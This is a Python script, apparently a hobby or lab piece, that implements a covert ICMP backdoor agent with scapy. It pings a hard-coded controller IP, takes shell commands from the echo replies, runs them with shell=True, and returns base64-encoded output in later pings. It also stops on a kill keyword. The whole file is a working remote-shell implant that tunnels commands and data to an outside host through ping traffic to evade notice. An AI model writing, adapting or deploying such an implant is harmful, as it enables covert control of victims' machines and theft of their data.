try:
    from scapy.all import *
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'scapy'])
finally:
    from scapy.all import *

import base64
from time import sleep
import subprocess
import sys
from shlex import split

srvip = '192.168.15.200'
cliip = '192.168.15.135'
comm = '_start__agent_'


# Sent last output, get, execute and return next command
def nextCommand(payload):
    global comm
    if comm == b'':
        comm = b'-' 
    req = IP(src=cliip, dst=srvip) / ICMP(type=8) / Raw(load=payload)
    print(f'Sending {payload} to {srvip}')
    resp = sr1(req, timeout=2, verbose=0)
    if resp and resp.haslayer(Raw):
        comm = resp[Raw].load.decode()
        print(f'Received {comm}')
        if comm == '-' or comm == '_start__agent_':
            print('\nNada por aqui...\n')
            return
        if comm == '_kill__agent_':
            print('\nFalow\n')
            exit()
        
        print('\nVamo ver...\n')
        stdout = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE).stdout.read()
        print(f'Executed, returned:\n{stdout}')
        comm = base64.b64encode(stdout)

def exec_cmd(cmd):
    pop = subprocess.Popen(split(cmd), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
    pop.wait()
    return pop.communicate()

while True:
    print('Waiting next command')
    try:
        nextCommand(comm)
    except:
        continue
    finally:
        sleep(10)



